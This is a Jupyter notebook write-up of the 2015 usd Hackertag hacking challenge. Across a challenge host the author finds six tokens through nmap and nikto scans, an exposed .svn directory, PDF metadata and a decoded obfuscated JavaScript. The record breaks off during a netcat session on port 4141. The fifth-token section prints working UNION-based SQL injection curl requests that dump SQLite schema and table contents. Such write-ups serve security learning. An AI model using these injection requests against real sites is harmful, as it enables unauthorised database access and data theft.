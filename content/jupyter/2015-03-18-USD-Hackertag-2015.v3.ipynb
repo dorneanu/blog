{
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.4.3"
  },
  "name": ""
 },
 "nbformat": 3,
 "nbformat_minor": 0,
 "worksheets": [
  {
   "cells": [
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "[usd AG](https://www.usd.de) has announced a [hacking challenge](https://www.usd.de/usd-hackertag-2015/) I have participated at. The target system was available at http://82.195.79.41/. Now let me sum up thg steps that have been required in order to get **all** 6 tokens."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# <!-- collapse=True -->\n",
      "import pandas as pd\n",
      "import sqlite3\n",
      "import binascii"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 122
    },
    {
     "cell_type": "heading",
     "level": 2,
     "metadata": {},
     "source": [
      "Scratch the surface"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Let's first conduct a **nmap** scan to see which ports are open."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "%%bash\n",
      "nmap -A -T4 82.195.79.41"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\n",
        "Starting Nmap 6.47 ( http://nmap.org ) at 2015-03-18 20:57 CET\n",
        "Nmap scan report for 82.195.79.41\n",
        "Host is up (0.053s latency).\n",
        "Not shown: 998 closed ports\n",
        "PORT     STATE SERVICE VERSION\n",
        "80/tcp   open  http    Apache httpd\n",
        "|_http-methods: No Allow or Public header in OPTIONS response (status code 200)\n",
        "| http-robots.txt: 2 disallowed entries \n",
        "|_/no/one/will/ever/know/ /~freddy/\n",
        "|_http-title: usd Hackertag Challenge Website\n",
        "7777/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)\n",
        "| ssh-hostkey: \n",
        "|   2048 c6:62:55:12:32:5d:d9:15:bc:1e:51:77:0e:5a:96:ea (RSA)\n",
        "|_  256 22:f9:96:0c:2e:99:11:17:d0:a8:89:41:40:b6:3d:58 (ECDSA)\n",
        "Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n",
        "\n",
        "Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .\n",
        "Nmap done: 1 IP address (1 host up) scanned in 11.70 seconds\n"
       ]
      }
     ],
     "prompt_number": 6
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "So we have **2 disallowed entries**. Let's have a look:"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!curl http://82.195.79.41//no/one/will/ever/know/"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\r\n",
        "<html>\r\n",
        " <head>\r\n",
        "  <title>Index of /no/one/will/ever/know</title>\r\n",
        " </head>\r\n",
        " <body>\r\n",
        "<h1>Index of /no/one/will/ever/know</h1>\r\n",
        "<table><tr><th><img src=\"/icons/blank.gif\" alt=\"[ICO]\"></th><th><a href=\"?C=N;O=D\">Name</a></th><th><a href=\"?C=M;O=A\">Last modified</a></th><th><a href=\"?C=S;O=A\">Size</a></th><th><a href=\"?C=D;O=A\">Description</a></th></tr><tr><th colspan=\"5\"><hr></th></tr>\r\n",
        "<tr><td valign=\"top\"><img src=\"/icons/back.gif\" alt=\"[DIR]\"></td><td><a href=\"/no/one/will/ever/\">Parent Directory</a></td><td>&nbsp;</td><td align=\"right\">  - </td><td>&nbsp;</td></tr>\r\n",
        "<tr><td valign=\"top\"><img src=\"/icons/text.gif\" alt=\"[TXT]\"></td><td><a href=\"secret.txt\">secret.txt</a></td><td align=\"right\">04-Mar-2015 15:23  </td><td align=\"right\"> 14 </td><td>&nbsp;</td></tr>\r\n",
        "<tr><th colspan=\"5\"><hr></th></tr>\r\n",
        "</table>\r\n",
        "</body></html>\r\n"
       ]
      }
     ],
     "prompt_number": 9
    },
    {
     "cell_type": "heading",
     "level": 3,
     "metadata": {},
     "source": [
      "First token"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "If you pay attention you'll see a **secret.txt** in that directory:"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!curl http://82.195.79.41//no/one/will/ever/know/secret.txt"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Token: 928191\r\n"
       ]
      }
     ],
     "prompt_number": 8
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Bingo! Ok what about `~freddy`:"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!curl http://82.195.79.41/~freddy/"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\r\n",
        "<html>\r\n",
        " <head>\r\n",
        "  <title>Index of /~freddy</title>\r\n",
        " </head>\r\n",
        " <body>\r\n",
        "<h1>Index of /~freddy</h1>\r\n",
        "<table><tr><th><img src=\"/icons/blank.gif\" alt=\"[ICO]\"></th><th><a href=\"?C=N;O=D\">Name</a></th><th><a href=\"?C=M;O=A\">Last modified</a></th><th><a href=\"?C=S;O=A\">Size</a></th><th><a href=\"?C=D;O=A\">Description</a></th></tr><tr><th colspan=\"5\"><hr></th></tr>\r\n",
        "<tr><td valign=\"top\"><img src=\"/icons/back.gif\" alt=\"[DIR]\"></td><td><a href=\"/\">Parent Directory</a></td><td>&nbsp;</td><td align=\"right\">  - </td><td>&nbsp;</td></tr>\r\n",
        "<tr><th colspan=\"5\"><hr></th></tr>\r\n",
        "</table>\r\n",
        "</body></html>\r\n"
       ]
      }
     ],
     "prompt_number": 14
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "OK, nothing to see here. **BUT**: We keep in mind that **freddy** is probably a local username."
     ]
    },
    {
     "cell_type": "heading",
     "level": 2,
     "metadata": {},
     "source": [
      "2nd token"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "The nmap results suggested that there is a HTTPD on port 80. Let's see what **nikto** finds:"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!nikto -host http://82.195.79.41/ -C all"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "- Nikto v2.1.5\n",
        "---------------------------------------------------------------------------\n",
        "+ Target IP:          82.195.79.41\n",
        "+ Target Hostname:    82.195.79.41\n",
        "+ Target Port:        80\n",
        "+ Start Time:         2015-03-18 20:07:20 (GMT1)\n",
        "---------------------------------------------------------------------------\n",
        "+ Server: Apache\n",
        "+ Uncommon header 'x-frame-options' found, with contents: sameorigin\n",
        "+ Server leaks inodes via ETags, header found with file /robots.txt, inode: 131873, size: 68, mtime: 0x511175d9c5600\n",
        "+ OSVDB-3268: /no/one/will/ever/know/: Directory indexing found.\n",
        "+ File/dir '/no/one/will/ever/know/' in robots.txt returned a non-forbidden or redirect HTTP code (200)\n",
        "+ OSVDB-3268: /~freddy/: Directory indexing found.\n",
        "+ File/dir '/~freddy/' in robots.txt returned a non-forbidden or redirect HTTP code (200)\n",
        "+ \"robots.txt\" contains 2 entries which should be manually viewed.\n",
        "+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.\n",
        "+ OSVDB-3092: /.svn/entries: Subversion Entries file may contain directory listing information.\n",
        "+ OSVDB-3092: /.svn/wc.db: Subversion SQLite DB file may contain directory listing information.\n",
        "+ 6545 items checked: 0 error(s) and 10 item(s) reported on remote host\n",
        "+ End Time:           2015-03-18 20:19:17 (GMT1) (717 seconds)\n",
        "---------------------------------------------------------------------------\n",
        "+ 1 host(s) tested\n"
       ]
      }
     ],
     "prompt_number": 16
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Besides thet *robots.txt* entries `.svn` looks very interesting. Let's have a closer look:"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "con = sqlite3.connect(\"wc.db\")"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 6
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "pd.read_sql(\"SELECT local_relpath, checksum FROM NODES\", con)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "html": [
        "<div style=\"max-height:1000px;max-width:1500px;overflow:auto;\">\n",
        "<table border=\"1\" class=\"dataframe\">\n",
        "  <thead>\n",
        "    <tr style=\"text-align: right;\">\n",
        "      <th></th>\n",
        "      <th>local_relpath</th>\n",
        "      <th>checksum</th>\n",
        "    </tr>\n",
        "  </thead>\n",
        "  <tbody>\n",
        "    <tr>\n",
        "      <th>0</th>\n",
        "      <td> download.php</td>\n",
        "      <td> $sha1$71d7c4326159dff73464c31c8b8f3ee0aad3a805</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>1</th>\n",
        "      <td>             </td>\n",
        "      <td>                                           None</td>\n",
        "    </tr>\n",
        "  </tbody>\n",
        "</table>\n",
        "</div>"
       ],
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 8,
       "text": [
        "  local_relpath                                        checksum\n",
        "0  download.php  $sha1$71d7c4326159dff73464c31c8b8f3ee0aad3a805\n",
        "1                                                          None"
       ]
      }
     ],
     "prompt_number": 8
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Obviously there is a `download.php` which we can retrieve from the SVN repo. Using the [tutorial](http://pen-testing.sans.org/blog/2012/12/06/all-your-svn-are-belong-to-us) one can access the files inside the repository very easily:"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!curl http://82.195.79.41/.svn/pristine/71/71d7c4326159dff73464c31c8b8f3ee0aad3a805.svn-base"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "<?php\r\n",
        "include \"src/header.php\";\r\n",
        "// Todo: Challenge fuer Token 102342 bauen.\r\n",
        "echo '\r\n",
        "        <div id=\"contentliquid\"><div id=\"content\">\r\n",
        "           <p>Die folgende Datei steht zum Download bereit:</p>\r\n",
        "\t<ul>\r\n",
        "\t<li><a href=\"dl/usd_Hackertag_2015.pdf\">usd Hackertag Poster (PDF-Format)</a></li>\r\n",
        "\t</ul>\r\n",
        "';\r\n",
        "\r\n",
        "echo \"</div></div>\";\r\n",
        "include \"src/menu.php\";\r\n",
        "include \"src/footer.php\";\r\n",
        "?>\r\n",
        "\r\n"
       ]
      }
     ],
     "prompt_number": 9
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "There is this line:\n",
      "    \n",
      "> Todo: Challenge fuer **Token 102342** bauen.\n"
     ]
    },
    {
     "cell_type": "heading",
     "level": 2,
     "metadata": {},
     "source": [
      "3rd Token"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {
      "collapsed": true
     },
     "source": [
      "Now let's have a look at the PDF under http://82.195.79.41/download.php.\n",
      "\n",
      "![hackertag](http://dl.dornea.nu/img/2015/hackertag/9ca3a31f6400a2bf414ad3802d296cd3.png)"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!file usd_Hackertag_2015.pdf"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "usd_Hackertag_2015.pdf: PDF document, version 1.3\r\n"
       ]
      }
     ],
     "prompt_number": 11
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "When you look at it (PDF viewer) nothing special about it. \n",
      "\n",
      "![hackertag](http://dl.dornea.nu/img/2015/hackertag/c304c9040deae8ee416f3e4f8a8f7802.png)\n",
      "\n",
      "Let's extract all available strings:"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!strings usd_Hackertag_2015.pdf | tail -n 20"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "/ModDate (D:20150220100358+01'00')\r\n",
        "/Producer (Adobe PDF library 10.01)\r\n",
        "/Title (usd Hackertag 2015)\r\n",
        "/Trapped /False\r\n",
        "/Subject (Token: 338912)\r\n",
        "endobj\r\n",
        "xref\r\n",
        "0000000000 65535 f\r\n",
        "0000608444 00000 n\r\n",
        "0000651051 00000 n\r\n",
        "trailer\r\n",
        "/Size 44\r\n",
        "/Root 6 0 R\r\n",
        "/Info 4 0 R\r\n",
        "/ID [ <B86554FD3FAA6D459E2C0B3D46980BDB> <f302C8F15AC3244B86122640F6B03D76> ]\r\n",
        "/Prev 116\r\n",
        "%EndExifToolUpdate 608422\r\n",
        "startxref\r\n",
        "651378\r\n",
        "%%EOF\r\n"
       ]
      }
     ],
     "prompt_number": 13
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Again bingo: **Token: 338912**"
     ]
    },
    {
     "cell_type": "heading",
     "level": 2,
     "metadata": {
      "collapsed": true
     },
     "source": [
      "4th Token"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Now let's have a look at the main [web-page](http://82.195.79.41/). Somewhere you'll see this line:\n",
      "\n",
      "```\n",
      "<script type=\"text/javascript\" src=\"http://82.195.79.41/js/jquery/jquery.js\"></script>\n",
      "```\n",
      "\n",
      "But wait a sec. JQuery? That sounds suspicious."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!curl http://82.195.79.41/js/jquery/jquery.js"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "eval(String.fromCharCode(105, 102, 32, 40, 119, 105, 110, 100, 111, 119, 46, 108, 111, 99, 97, 116, 105, 111, 110, 46, 104, 111, 115, 116, 110, 97, 109, 101, 32, 61, 61, 32, 34, 49, 50, 55, 46, 48, 46, 48, 46, 49, 34, 41, 32, 123, 10, 118, 97, 114, 32, 95, 48, 120, 98, 55, 57, 97, 61, 91, 34, 92, 120, 53, 55, 92, 120, 54, 57, 92, 120, 54, 67, 92, 120, 54, 67, 92, 120, 54, 66, 92, 120, 54, 70, 92, 120, 54, 68, 92, 120, 54, 68, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 50, 48, 92, 120, 55, 65, 92, 120, 55, 53, 92, 120, 55, 50, 92, 120, 70, 67, 92, 120, 54, 51, 92, 120, 54, 66, 92, 120, 50, 48, 92, 120, 54, 54, 92, 120, 55, 50, 92, 120, 54, 53, 92, 120, 54, 52, 92, 120, 54, 52, 92, 120, 55, 57, 92, 120, 50, 69, 92, 120, 50, 48, 92, 120, 52, 52, 92, 120, 54, 53, 92, 120, 55, 50, 92, 120, 50, 48, 92, 120, 54, 55, 92, 120, 54, 53, 92, 120, 54, 56, 92, 120, 54, 53, 92, 120, 54, 57, 92, 120, 54, 68, 92, 120, 54, 53, 92, 120, 50, 48, 92, 120, 53, 52, 92, 120, 54, 70, 92, 120, 54, 66, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 50, 48, 92, 120, 54, 67, 92, 120, 54, 49, 92, 120, 55, 53, 92, 120, 55, 52, 92, 120, 54, 53, 92, 120, 55, 52, 92, 120, 51, 65, 92, 120, 50, 48, 92, 120, 51, 52, 92, 120, 51, 49, 92, 120, 51, 55, 92, 120, 51, 56, 92, 120, 51, 53, 92, 120, 51, 53, 34, 93, 59, 97, 108, 101, 114, 116, 40, 95, 48, 120, 98, 55, 57, 97, 91, 48, 93, 41, 59, 10, 125));\r\n"
       ]
      }
     ],
     "prompt_number": 17
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "char_codes = !curl http://82.195.79.41/js/jquery/jquery.js"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 40
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# Convert char codes to string\n",
      "char_codes = char_codes[5][25:-3].split(',')\n",
      "string_message = ''.join(chr(int(i)) for i in char_codes)\n",
      "string_message"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 41,
       "text": [
        "'if (window.location.hostname == \"127.0.0.1\") {\\nvar _0xb79a=[\"\\\\x57\\\\x69\\\\x6C\\\\x6C\\\\x6B\\\\x6F\\\\x6D\\\\x6D\\\\x65\\\\x6E\\\\x20\\\\x7A\\\\x75\\\\x72\\\\xFC\\\\x63\\\\x6B\\\\x20\\\\x66\\\\x72\\\\x65\\\\x64\\\\x64\\\\x79\\\\x2E\\\\x20\\\\x44\\\\x65\\\\x72\\\\x20\\\\x67\\\\x65\\\\x68\\\\x65\\\\x69\\\\x6D\\\\x65\\\\x20\\\\x54\\\\x6F\\\\x6B\\\\x65\\\\x6E\\\\x20\\\\x6C\\\\x61\\\\x75\\\\x74\\\\x65\\\\x74\\\\x3A\\\\x20\\\\x34\\\\x31\\\\x37\\\\x38\\\\x35\\\\x35\"];alert(_0xb79a[0]);\\n}'"
       ]
      }
     ],
     "prompt_number": 41
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# Decode hex string to ascii\n",
      "hex_code = string_message[61:-23].replace('\\\\x', '')\n",
      "binascii.unhexlify(hex_code)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 64,
       "text": [
        "b'Willkommen zur\\xfcck freddy. Der geheime Token lautet: 417855'"
       ]
      }
     ],
     "prompt_number": 64
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Our found token: **417855**"
     ]
    },
    {
     "cell_type": "heading",
     "level": 2,
     "metadata": {},
     "source": [
      "5th Token"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "I must say this part of the challenge was the most \"challenging\" one. The found vulnerability was actually obvious but it took me to long to exploit it :D But first a short introduction to the vulnerability itself.\n",
      "\n",
      "There was this link http://82.195.79.41/liste.php?id=1 which caught my attention from the beginning. \n",
      "\n",
      "![hackertag](http://dl.dornea.nu/img/2015/hackertag/0b0663206b0bb77ffcb484f606c39936.png)\n",
      "\n",
      "The first thing I did:"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!curl \"http://82.195.79.41/liste.php?id=1'\" 2> /dev/null | tail -n 1"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "<div id=\"contentliquid\"><div id=\"content\">unrecognized token: \"'1'';\""
       ]
      }
     ],
     "prompt_number": 75
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Aha.. Ok. Let's try again:"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!curl \"http://82.195.79.41/liste.php?id=1'%20OR 1=1\" 2> /dev/null | tail -n 1"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "<div id=\"contentliquid\"><div id=\"content\">unrecognized token: \"';\""
       ]
      }
     ],
     "prompt_number": 82
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "What about the next one?"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!curl \"http://82.195.79.41/liste.php?id=NULL'%20UNION%20ALL%20SELECT%20'a','k';--#\" 2> /dev/null | tail -n 20"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "<div id=\"contentliquid\"><div id=\"content\"><ul><li><a href=\"/liste.php?id=a\">k</a><ul></div></div>\r\n",
        "        <div id=\"leftcolumn\">\r\n",
        "\t<ul>\r\n",
        "\t<li><a href=\"http://82.195.79.41/index.php\">Startseite</a></li>\r\n",
        "\t<li><a href=\"http://82.195.79.41/liste.php\">Todo-Liste</a></li>\r\n",
        "\t<li><a href=\"http://82.195.79.41/restricted/index.php\">Backend</a></li>\r\n",
        "\t<li><a href=\"http://82.195.79.41/download.php\">Downloads</a></li>\r\n",
        "\t<li><a href=\"http://www.usd.de/impressum/\" target=\"_blank\">Impressum</a></li>\r\n",
        "\t<li><a href=\"http://www.usd.de/datenschutz/\" target=\"_blank\">Datenschutz</a></li>\r\n",
        "\t</ul>\r\n",
        "        </div>\r\n",
        "\r\n",
        "        <div id=\"footer\">\r\n",
        "            <p></p>\r\n",
        "        </div>\r\n",
        "    </div>\r\n",
        "</body>\r\n",
        "</html>\r\n",
        "\r\n",
        "\r\n"
       ]
      }
     ],
     "prompt_number": 89
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Have you noticed this line?\n",
      "\n",
      "```\n",
      "<div id=\"contentliquid\"><div id=\"content\"><ul><li><a href=\"/liste.php?id=a\">k</a><ul></div></div>\n",
      "```\n",
      "\n",
      "**a** and **b** were successfully \"merged\" into the results. Now the biggest problem I had was the fingerprinting of the DB itself. OWASP has [sth](https://www.owasp.org/index.php/OWASP_Backend_Security_Project_DBMS_Fingerprint#Fingerprinting_through_SQL_Dialect_Injection) you can use in your tests. But the most useful thing is to test for *string concatenation* (nice article [here](http://digitizor.com/2009/03/27/sql-injection-2-fingerprinting/)). So I've tried several things:"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!curl \"http://82.195.79.41/liste.php?id=NULL'%20UNION%20ALL%20SELECT%20CONCAT('a', 'b'),'k';--#\" 2> /dev/null | grep \"contentliquid\""
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "<div id=\"contentliquid\"><div id=\"content\">unrecognized token: \"';\"\r\n"
       ]
      }
     ],
     "prompt_number": 91
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!curl \"http://82.195.79.41/liste.php?id=NULL'%20UNION%20ALL%20SELECT%20'a'+'b','k';--#\" 2> /dev/null | grep \"contentliquid\""
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "<div id=\"contentliquid\"><div id=\"content\"><ul><li><a href=\"/liste.php?id=a\">k</a><ul></div></div>\r\n"
       ]
      }
     ],
     "prompt_number": 93
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!curl \"http://82.195.79.41/liste.php?id=NULL'%20UNION%20ALL%20SELECT%20'a'||'b','k';--#\" 2> /dev/null | grep \"contentliquid\""
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "<div id=\"contentliquid\"><div id=\"content\"><ul><li><a href=\"/liste.php?id=ab\">k</a><ul></div></div>\r\n"
       ]
      }
     ],
     "prompt_number": 94
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Well `'a'||'b'` seemed to work. That syntax is *Oracle* specific. But also *SQLite* specific. And this was my biggest mistake: I was searching for Oracle specific injections, but the DBMS was in fact SQLite. Finally I've constructed this query:"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!curl \"http://82.195.79.41/liste.php?id=NULL'%20UNION%20ALL%20SELECT%20'a',name%20FROM%20sqlite_master;--#\" 2> /dev/null | grep \"contentliquid\""
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "<div id=\"contentliquid\"><div id=\"content\"><ul><li><a href=\"/liste.php?id=a\">token</a><li><a href=\"/liste.php?id=a\">public</a><ul></div></div>\r\n"
       ]
      }
     ],
     "prompt_number": 99
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "So there are 2 tables available:\n",
      "    \n",
      "* token\n",
      "* public\n",
      "\n",
      "Let's have a look at the schema of `token`:"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!curl \"http://82.195.79.41/liste.php?id=NULL'%20UNION%20ALL%20SELECT%20'a',sql%20FROM%20sqlite_master%20WHERE%20name='token';--#\" 2> /dev/null | grep \"contentliquid\""
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "<div id=\"contentliquid\"><div id=\"content\"><ul><li><a href=\"/liste.php?id=a\">CREATE TABLE token (token_val NUMERIC)</a><ul></div></div>\r\n"
       ]
      }
     ],
     "prompt_number": 101
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Ok, now go for it:"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!curl \"http://82.195.79.41/liste.php?id=NULL'%20UNION%20ALL%20SELECT%20'a',token_val%20FROM%20token;--#\" 2> /dev/null | grep \"contentliquid\""
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "<div id=\"contentliquid\"><div id=\"content\"><ul><li><a href=\"/liste.php?id=a\">336809</a><ul></div></div>\r\n"
       ]
      }
     ],
     "prompt_number": 102
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Token **336809** is the next one. "
     ]
    },
    {
     "cell_type": "heading",
     "level": 2,
     "metadata": {},
     "source": [
      "6th and last Token"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "While looking for tokens, I have seen this message a couple of times:\n",
      "    \n",
      "![hackertag](http://dl.dornea.nu/img/2015/hackertag/08e649ee3231f07d05c42df5c11de2ab.png)"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "The realm says: **80 is just a number of 65535**. Ok hat was a hint for more undetected ports. I've run *nmap* again:\n",
      "\n",
      "```\n",
      "# nmap -sT -p 0-65535 82.195.79.41\n",
      "...\n",
      "Nmap scan report for 82.195.79.41\n",
      "Host is up (0.036s latency).\n",
      "Not shown: 65533 closed ports\n",
      "PORT     STATE SERVICE\n",
      "80/tcp   open  http\n",
      "4141/tcp open  oirtgsvc\n",
      "7777/tcp open  cbt\n",
      "\n",
      "Nmap done: 1 IP address (1 host up) scanned in 2485.52 seconds\n",
      "```\n",
      "\n",
      "OH! What's behind port **4141**?"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!nc 82.195.79.41 4141"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\r\n",
        "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\r\n",
        "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKxc:l0WMMMMMMMMMMMMMM\r\n",
        "dddddddddddddddddddddddxdddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNWMMMMM0:......o0NMMMMMMMMMMMM\r\n",
        "dddddddddddddddxxxxdddddddxxxxxddddddddddddddddddddddddddddddxO00kdddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM0,',;cdOl..........';cdNMMMMMMMM\r\n",
        "ddddddddddddddxKNNOdddddddOXNXkdddddddddddddddddddddddddddddxxXMMKxddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNc....:Kk;............'KMMMMMMMM\r\n",
        "ddddddddddddddxNMW0dddddddOWMNkddddddddddddddddddddddddddddddxXMMKdddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNx;...lO0xc,.........cWMMMMMMMM\r\n",
        "ddddddddddddddxNMW0dddddddOWMNkdddxxkO000OkxddddddxkO000kxxdxxXMMKdddxO00OxddxKMMN00XWNKKKXNWWWXKKKNWMMMMMMWXKKKXNWMMMMMMMMMMMMMMMMMX:....:xKKxl,......kMMMMMMMMM\r\n",
        "ddddddddddddddxNMW0dddddddOWMNkddxOXWWWNWWWXkxddx0NWWWWWWN0xxxXMMKxdkKWWXOxddxKMMKddxkxxxxxx00kxxxdxONMMMWKkxxxxxxONMMMMMMMMMMMMMMMN0::;....,ckKKkoc:;dNMMMMMMMMM\r\n",
        "ddddddddddddddxNMMNKKKKKKKXWMNkddxKXXOxxkKWMNkdx0WWKOxxkXWW0dxXMMKxkNMW0xddxdxKMMKddkKNWNKxdxOXNNNOdd0WMWOxx0NWNKkdkNMMMMMMMMMMMMWK00OOkoo:'...';ldxxl;dXMMMMMMMM\r\n",
        "ddddddddddddddxNMMNXXXXXXXNWMNkddddxkkOOO0NMWOdkNMXxddddxkOkdxXMMWXWMNOxdddxdxKMMKddONMMMWOxxKMMMMKxdkWMXxdx00000kxx0WMMMMMMMMMWNK00000000Okdc,.........;OWMMMMMM\r\n",
